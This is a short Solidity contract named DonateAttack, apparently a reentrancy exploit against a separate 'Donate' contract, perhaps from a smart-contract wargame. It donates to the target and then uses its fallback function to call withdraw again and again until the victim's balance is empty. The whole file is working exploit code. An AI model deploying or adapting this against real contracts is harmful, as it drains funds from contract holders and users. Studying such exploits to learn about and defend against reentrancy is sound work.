pragma solidity ^0.8.0;

import "./Donate.sol";

contract DonateAttack{
    Donate victim;
    uint public amount = 0.001 ether; 
    
    constructor(address payable _targetAddr) public payable {
        victim = Donate(_targetAddr);
    }
    function donateToTarget() public {
        victim.donate{value: amount, gas: 4000000}(address(this));
    }

    fallback() external payable {
        if (address(victim).balance != 0) {
            victim.withdraw(amount);
        }
    }
}

